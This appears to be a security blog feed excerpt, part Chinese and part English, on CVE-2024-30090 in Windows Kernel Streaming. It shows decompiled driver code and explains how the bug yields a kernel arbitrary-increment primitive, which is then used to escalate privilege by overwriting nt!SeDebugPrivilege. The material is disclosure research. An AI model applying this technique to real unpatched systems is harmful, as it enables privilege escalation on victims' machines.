&lt;p&gt;至於甚麼時候會用到你所構造的 KS Object 呢? 當事件觸發時， ks 會透過 DPC 呼叫 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks!ksGenerateEvent&lt;/code&gt;，此時就會依照你所給定的 NotificationType 來決定要怎麼處理你的事件。&lt;/p&gt;

&lt;p&gt;我們就來看一下 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsGenerateEvent&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;NTSTATUS __stdcall KsGenerateEvent(PKSEVENT_ENTRY EventEntry)
{

  switch ( EventEntry-&amp;gt;NotificationType )
  {
    case KSEVENTF_DPC:
      ...
      if ( !KeInsertQueueDpc(EventEntry-&amp;gt;EventData-&amp;gt;Dpc.Dpc, EventEntry-&amp;gt;EventData, 0LL) )
        _InterlockedAdd(&amp;amp;EventEntry-&amp;gt;EventData-&amp;gt;EventObject.Increment, 0xFFFFFFFF); //--------[6]
      ...
    case KSEVENTF_KSWORKITEM:
      ...
      KsIncrementCountedWorker(eventdata-&amp;gt;KsWorkItem.KsWorkerObject); //-----------[7]

  }
}

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;其實到這邊就有多種利用方式可以利用，最直接的莫過於直接構造 DPC 結構註冊 DPC 來達成任意 Kernel 程式碼執行，也就是上面程式碼片段 [6] 的地方，&lt;strong&gt;但在呼叫 KsGenerateEvent 時的 IRQL 是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DISPATCH_LEVEL&lt;/code&gt; 很難在 User space 下構造 DPC object 利用過程也會遇到許多問題&lt;/strong&gt;。&lt;/p&gt;

&lt;p&gt;所以我們改用另外一條 KSEVENTF_KSWORKITEM，也就是程式碼片段 [7] 的部分，藉由傳入 Kernel 位置，讓他誤認為是 KSWORKITEM 的指標。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;其中就會對該指標指向位置加上 0x5c 的地方加一，也就是可以達到任意 Kerenl Address 加一的寫入，其整個過程就如下圖：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在呼叫 IOCTL_KS_ENABLE_EVENT 時，構造 KSEVENTDATA 指向 Kernel 記憶體位置後，ks 處理時就會將它作為 Kernel Object 來操作，並註冊指定的事件&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;而到觸發時，ks 就會將我們給的記憶體位置內容 +1，因此我們這邊就有了一個 kernel 任意 +1 的 primitive 了。&lt;/p&gt;

&lt;h3 id=&quot;arbitrary-increment-primitive-to-eop&quot;&gt;Arbitrary increment primitive to EoP&lt;/h3&gt;

&lt;p&gt;從任意記憶體位置 +1 到提權有許多方法可以利用，其中最知名的莫過於 &lt;a href=&quot;https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernal_Slides.pdf&quot;&gt;Abuse token privilege&lt;/a&gt; 以及 &lt;a href=&quot;https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/&quot;&gt;IoRing&lt;/a&gt;，原本以為到這邊就差不多結束了…&lt;/p&gt;

&lt;p&gt;然而上述兩種方法在這個情境中都有一定的侷限：&lt;/p&gt;

&lt;h4 id=&quot;abuse-token-privilege&quot;&gt;Abuse token Privilege&lt;/h4&gt;
&lt;p&gt;如果是以 Abuse token privilege 方法來做提權，其關鍵在於覆寫 Privileges.Enable 及 Privileges.Present，而我們漏洞一次只能 +1 ，如果要拿到 SeDebugPrivilege 就必須兩個欄位都要寫到，這兩格欄位的預設數值為 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x602880000&lt;/code&gt; 及 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x800000&lt;/code&gt; 必須要變成，0x602&lt;strong&gt;9&lt;/strong&gt;80000 及 0x&lt;strong&gt;9&lt;/strong&gt;00000，也就是說分別都要各寫 0x10 次，總共要 0x20 次的寫入，每次的寫入都要 race，需要花上不少時間，穩定度也大幅下降。&lt;/p&gt;

&lt;h4 id=&quot;ioring&quot;&gt;IoRing&lt;/h4&gt;
&lt;p&gt;透過 IoRing 來達到任意寫入，也許會是個更簡單的方法，只需覆寫 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IoRing-&amp;gt;RegBuffersCount&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IoRing-&amp;gt;RegBuffers&lt;/code&gt; 就可達到任意寫入，然而有個問題就發生了…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在觸發任意記憶體位置 +1 這個 primitive 時，如果原先的數值是 0 時，就會進到 KsQueueWorkItem 中，其中會有一些相對應複雜的處理，就會導致 BSoD， IoRing 的利用方式剛好就會遇到這狀況…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;是不是真的沒辦法穩定利用了呢?&lt;/p&gt;

&lt;h4 id=&quot;lets-find-a-new-way-&quot;&gt;Let’s find a new way !&lt;/h4&gt;
&lt;blockquote&gt;
  &lt;p&gt;當傳統的利用方法遇到瓶頸時，深入探討技術的核心機制可能會是值得的。你或許會在此過程中意外發現新的方法。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;經過幾天沉思之後，我們決定找尋新方法，但從頭找新的方法可能會花不少時間也可能找不到，於是我們決定從舊有的兩個方法中找尋新的靈感，首先來看的是 Abuse token privilege，其中最關鍵的就是利用漏洞拿到 SeDebugPrivilege 使得我們可以 Open 像是 winlogon 等高權限的 Process。&lt;/p&gt;

&lt;p&gt;問題就來了，&lt;strong&gt;為什麼只要有 SeDebugPrivilege 就可以開啟高權限的 Process 呢？&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;這邊就要來看一下 PsOpenProcess，以下是 PsOpenProcess 的程式碼片段：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;由此可見，當我們在 Open Process 時， kernel 會優先使用 SeSinglePrivilegeCheck 檢查你是否有 SeDebugPrivilege，如果你具有 SeDebugPrivilege 那就會給你 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PROCESS_ALL_ACCESS&lt;/code&gt; 的權限，不會有其他 ACL 的檢查，讓你可以對任意 Process 去做任何事情，顧名思義就是讓你 Debug 用的，然而有一點值得注意的地方是 SeDebugPrivilege 是在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ntoskrnl.exe&lt;/code&gt; 上的全域變數。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;它會是個 &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-luid&quot;&gt;LUID&lt;/a&gt; 結構，會在系統啟動時初始化，實際數值為 0x14 ，表示在 Privileges.Enable 及 Privileges.Present 欄位中哪個 bit 是代表 SeDebugPrivilege。所以當我們在用 NtOpenProcess 時，系統去查看這個全域變數中的數值。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;獲得要檢查的數值後，就會依照這個數值去檢查 Token 中的 Privileges 欄位是否有 Enable 及 Present 這個欄位，以 SeDebugPrivilege 來說就會檢查&lt;strong&gt;第 0x14 bit&lt;/strong&gt;。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;然而有一件有趣的事情是…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt!SeDebugPrivilege&lt;/code&gt; 這個全域變數是&lt;strong&gt;位於可寫的區段中&lt;/strong&gt;!&lt;/p&gt;

&lt;p&gt;因此一個新的想法就誕生了。&lt;/p&gt;

&lt;h4 id=&quot;make-abusing-token-privilege-great-again-&quot;&gt;Make abusing token privilege great again !&lt;/h4&gt;

&lt;p&gt;預設情況下，一般權限的使用者會像這張圖一樣，僅有少數的 Privileges&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;不過我們可以注意到的是，大部分情況下都會有 SeChangeNotifyPrivilege 且是 Enable 的。這時我們就可以來看看初始化的地方，就可發現 SeChangeNotifyPrivilege 所代表是數值為 0x17。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;那如果我們利用漏洞把 SeDebugPrivilege 從 0x14 換成 0x17 會發生甚麼事情呢?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;如上圖，在原先 OpenProcess 的流程中，依舊會先去看 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt!SeDebugPrivilege&lt;/code&gt; 中的數值，而這時獲得的數值為 0x17(SeChangeNotifyPrivilege)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;接下來的檢查就會以 0x17 對當前 Process token 做驗證，看看有沒有這個 Privilege，然而一般使用者都會有這個 Privilege，因此即使你沒有 SeDebugPrivilege 也會直接通過檢查，拿到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PROCESS_ALL_ACCESS&lt;/code&gt;，&lt;strong&gt;也就是說任何擁有 SeChangeNotifyPrivilege 都可以 open 除了 PPL 之外的高權限的 Process&lt;/strong&gt;。&lt;/p&gt;

&lt;p&gt;此外利用我們上述的漏洞來將 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt!SeDebugPrivilege&lt;/code&gt; 從 0x14 改成 0x17，因為原本的數值不是 0 是不會受到 KsQueueWorkItem 影響的，因此非常適合我們。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在可以 open 高權限的 Process 後，提權方式就與一般的 Abuse token privilege 方法相同就不再這邊多提了，最終我們又在一次利用 Proxying to kernel 成功在 Windows 11 23H2 上達成 EoP。&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/m2TNVDgz7CI?si=YJQ9_u7xoyVt1wRm&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h4 id=&quot;remark&quot;&gt;Remark&lt;/h4&gt;
&lt;p&gt;實際上來說，這個方法也適用於其他高權限的 Privilege 中&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;SeTcbPrivilege = 0x7&lt;/li&gt;
  &lt;li&gt;SeTakeOwnershipPrivilege = 0x9&lt;/li&gt;
  &lt;li&gt;SeLoadDriverPrivilege = 0xa&lt;/li&gt;
  &lt;li&gt;…&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;the-next--summary&quot;&gt;The Next &amp;amp; Summary&lt;/h2&gt;
&lt;p&gt;這兩篇文章中，主要著重於我們怎麼從過往的漏洞分析到發現新漏洞的過程，如何從過去的研究之中獲得新的想法、新的利用方式，新的漏洞以及新的攻擊面。關於這種 Proxy 類型的 Bug class 可能還存在很多，也可能不只侷限於 Kernel Streaming 和 &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/nf-wdm-iobuilddeviceiocontrolrequest&quot;&gt;IoBuildDeviceIoControlRequest&lt;/a&gt;，我認為算是 Windows 設計上的一個小缺陷，如果認真找可能還會找到一些漏洞，這類型的漏洞你需要關注的地方就是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; 設置的時間點，如果設置 KernelMode 之後還有拿使用者的輸入做事情，就有機會出問題，而且這類型的漏洞往往都很好用。&lt;/p&gt;

&lt;p&gt;在 Kernel Streaming 中，我認為應該不少潛在的安全性漏洞，他也還有很多元件像是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Hdaudio.sys&lt;/code&gt; 或是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Usbvideo.sys&lt;/code&gt; 可能也是個可以看的方向，也是個適合 fuzzing 的地方。如果你是個 Kernel driver 開發者最好不要只有檢查 Irp-&amp;gt;Requestormode，Windows 架構下很有可能還是有問題。最後再次強烈建議大家盡速更新 Windows 到最新版本中。&lt;/p&gt;

&lt;h2 id=&quot;is-that-the-end-of-it-&quot;&gt;Is that the end of it ?&lt;/h2&gt;
&lt;p&gt;實際上來說除了 Proxy 類型的漏洞之外，我們還有找到其他更多的 Bug class 使得我們在 Kernel Streaming 上找到超過 20 個漏洞，有些漏洞非常特別，敬請期待 Part III。&lt;/p&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernal_Slides.pdf&quot;&gt;Easy Local Windows Kernel Exploitation&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/&quot;&gt;One I/O Ring to Rule Them All: A Full Read/Write Exploit Primitive on Windows 11
&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2024/10/05/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part2/</link>
                <guid>https://devco.re/blog/2024/10/05/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part2</guid>
                <pubDate>Sat, 05 Oct 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Streaming vulnerabilities from Windows Kernel - Proxying to Kernel - Part II</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2024/10/05/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part2-en/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2024/10/05/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part2/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This is a series of research related to Kernel Streaming attack surface. It is recommended to read the following articles first.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1-en/&quot;&gt;Streaming vulnerabilities from Windows Kernel - Proxying to Kernel - Part I&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In the previous research on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Proxying to Kernel&lt;/code&gt;, we discovered multiple vulnerabilities in Kernel Stearming as well as an overlooked bug Class. We successfully exploited vulnerabilities CVE-2024-35250 and CVE-2024-30084 to compromise Windows 11 at Pwn2Own Vancouver 2024.&lt;/p&gt;

&lt;p&gt;In this article, we will continue to explore this attack surface and bug Class, revealing another vulnerability and exploitation technique, which was also presented at &lt;a href=&quot;https://www.hexacon.fr/&quot;&gt;HEXACON 2024&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;After Pwn2Own Vancouver 2024, we continued to investigate the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks!KsSynchronousIoControlDevice&lt;/code&gt; bug pattern to see if there were any other security issues. However, after some time, we did not find any other exploitable points in the property operations of KS object. Therefore, we shifted our focus to another feature, KS Event.&lt;/p&gt;

&lt;h2 id=&quot;ks-event&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/ks-events&quot;&gt;KS Event&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Similar to the &lt;a href=&quot;https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1-en/#ks-property&quot;&gt;KS Property&lt;/a&gt; mentioned in the previous article, the KS object not only has its own property set but also provides the functionality to set KS Event. For instance, you can set an event to trigger when the device status changes or at regular intervals, which is convenient for developers of playback software to define subsequent behaviors. Each KS Event, like a property, requires the KS object to support it to be used. We can register or disable these Events through &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/ks/ni-ks-ioctl_ks_enable_event&quot;&gt;IOCTL_KS_ENABLE_EVENT&lt;/a&gt; and &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/ks/ni-ks-ioctl_ks_disable_event&quot;&gt;IOCTL_KS_DISABLE_EVENT&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;kseventdata&quot;&gt;KSEVENTDATA&lt;/h3&gt;
&lt;p&gt;When registering a KS Event, you can register the desired event by providing &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ks/ns-ks-kseventdata&quot;&gt;KSEVENTDATA&lt;/a&gt;. You can include handles such as EVENT_HANDLE and SEMAPHORE_HANDLE in the registration. When KS triggers this event, it will notify you using the provided handle.&lt;/p&gt;

&lt;h3 id=&quot;the-work-flow-of-ioctl_ks_enable_event&quot;&gt;The work flow of IOCTL_KS_ENABLE_EVENT&lt;/h3&gt;
&lt;p&gt;The entire work flow is similar to IOCTL_KS_PROPERTY. When calling DeviceIoControl, as shown in the figure below, the user’s requests are sequentially passed to the corresponding driver for processing.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Similarly, in step 3, 32-bit requests will be converted into 64-bit requests. By step 6, ks.sys will determine which driver and &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ks/nc-ks-pfnksaddevent&quot;&gt;addhandler&lt;/a&gt; to handle your request based on the event of your requests.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finally, forward it to the corresponding driver. As shown in the figure above, it is finally forwarded to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsiDefaultClockAddMarkEvent&lt;/code&gt; in ks to set the &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/nf-wdm-kesettimerex&quot;&gt;timer&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;After grasping the KS Event functionality and process, we swiftly identified another exploitable vulnerability, &lt;a href=&quot;https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-30090&quot;&gt;CVE-2024-30090&lt;/a&gt;, based on the previous &lt;a href=&quot;https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1/#the-new-bug-pattern&quot;&gt;bug pattern&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;proxying-to-kernel-again-&quot;&gt;Proxying to kernel again !&lt;/h2&gt;

&lt;p&gt;This time, the issue occurs when &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk&lt;/code&gt; converts a 32-bit request into a 64-bit one.&lt;/p&gt;

&lt;p&gt;As shown in the figure below, when &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk&lt;/code&gt; receives an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_ENABLE_EVENT&lt;/code&gt; request and the request is from a WoW64 Process, it will perform the conversion from a 32-bit structure to a 64-bit structure.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The conversion would call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk!CKSAutomationThunk::ThunkEnableEventIrp&lt;/code&gt; to handle it.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;__int64 __fastcall CKSAutomationThunk::ThunkEnableEventIrp(__int64 ioctlcode_d, PIRP irp, __int64 a3, int *a4)
{
  ...
  if ( (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_ENABLE
    || (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_ONESHOT
    || (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_ENABLEBUFFERED )  
  {
    // Convert 32-bit requests and pass down directly
  }
  else if ( (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_QUERYBUFFER ) 
  {
    ...
    newinputbuf = (KSEVENT *)ExAllocatePoolWithTag((POOL_TYPE)0x600, (unsigned int)(inputbuflen + 8), &apos;bqSK&apos;);
    ...
    memcpy(newinputbuf,Type3InputBuffer,0x28);  //------------------------[1]
    ...
    v18 = KsSynchronousIoControlDevice( 
            v25-&amp;gt;FileObject,
            0,
            IOCTL_KS_ENABLE_EVENT,
            newinputbuf,
            inputbuflen + 8,
            OutBuffer,
            outbuflen,
            &amp;amp;BytesReturned);  //-----------------[2]
    ...
  }
  ...
}

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;In &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CKSAutomationThunk::ThunkEnableEventIrp&lt;/code&gt;, a similar bug pattern is clearly visible. You can see that during the processing, the original request is first copied into a newly allocated buffer at [1]. Subsequently, this buffer is used to call the new IOCTL using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsSynchronousIoControlDevice&lt;/code&gt; at [2]. Both &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;newinputbuf&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OutBuffer&lt;/code&gt; are controlled by the user.&lt;/p&gt;

&lt;p&gt;The flow when calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CKSAutomationThunk::ThunkEnableEventIrp&lt;/code&gt; is illustrated as follows:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When calling IOCTL in a WoW64 process, you can see in step 2 of the diagram that the I/O Manager sets &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; to UserMode(1). In step 3, ksthunk converts the user’s request from 32-bit to 64-bit, handled by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CKSAutomationThunk::ThunkEnableEventIrp&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Afterward, in step 5, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsSynchronousIoControlDevice&lt;/code&gt; will be called to issue the IOCTL, and at this point, the new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; has become &lt;strong&gt;KernelMode(0)&lt;/strong&gt;. The subsequent processing is the same as a typical &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_ENABLE_EVENT&lt;/code&gt;, so it won’t be detailed further. In summary, we now have a primitive that allows us to perform arbitrary &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_ENABLE_EVENT&lt;/code&gt; with KernelMode. Next, we need to look for places where we can achieve EoP.&lt;/p&gt;

&lt;h2 id=&quot;the-exploitation&quot;&gt;The Exploitation&lt;/h2&gt;
&lt;p&gt;Following the &lt;a href=&quot;https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1-en/#the-eop&quot;&gt;previous approach&lt;/a&gt;, we first analyzed the entry point &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk&lt;/code&gt;. However, after searching for a while, we found no potential privilege escalation points. In &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk&lt;/code&gt;, most instances where &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestMode&lt;/code&gt; is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode(0)&lt;/code&gt; are directly passed down without additional processing. Therefore, we shifted our eyes to the next layer, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks&lt;/code&gt;, to see if there are any opportunities for privilege escalation during the event handling process.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Quickly, we found a place that caught our attention.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KspEnableEvent&lt;/code&gt; handler, a code snippet first checks the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NotificationType&lt;/code&gt; in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSEVENTDATA&lt;/code&gt; you passed in to determine how to register and handle your event. In general, it usually provides an &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-createeventa&quot;&gt;EVENT_HANDLE&lt;/a&gt; or a &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createsemaphorea&quot;&gt;SEMAPHORE_HANDLE&lt;/a&gt;. However, in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks&lt;/code&gt;, if called from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode&lt;/code&gt;, we can provide an &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/event-objects&quot;&gt;Event Object&lt;/a&gt; or even a &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/introduction-to-dpc-objects&quot;&gt;DPC Object&lt;/a&gt; to register your event, making the overall handling more efficient.&lt;/p&gt;

&lt;p&gt;This means we can use this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DeviceIoControl&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode&lt;/code&gt; primitive to provide a &lt;strong&gt;kernel object&lt;/strong&gt; for subsequent processing. If constructed well, it might achieve &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EoP&lt;/code&gt;, but it depends on how this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Object&lt;/code&gt; is used later.&lt;/p&gt;

&lt;p&gt;However, after trying for a while, we discovered that …&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;__int64 __fastcall CKSAutomationThunk::ThunkEnableEventIrp(__int64 ioctlcode_d, PIRP irp, __int64 a3, int *a4)
{
  ...
  if ( (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_ENABLE
    || (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_ONESHOT
    || (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_ENABLEBUFFERED )  //-------[3]
  {
    // Convert 32-bit requests and pass down directly
  }
  else if ( (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_QUERYBUFFER ) //-------[4]
  {
    ...
    newinputbuf = (KSEVENT *)ExAllocatePoolWithTag((POOL_TYPE)0x600, (unsigned int)(inputbuflen + 8), &apos;bqSK&apos;);
    ...
    memcpy(newinputbuf,Type3InputBuffer,0x28); //------[5] 
    ...
    v18 = KsSynchronousIoControlDevice( 
            v25-&amp;gt;FileObject,
            0,
            IOCTL_KS_ENABLE_EVENT,
            newinputbuf,
            inputbuflen + 8,
            OutBuffer,
            outbuflen,
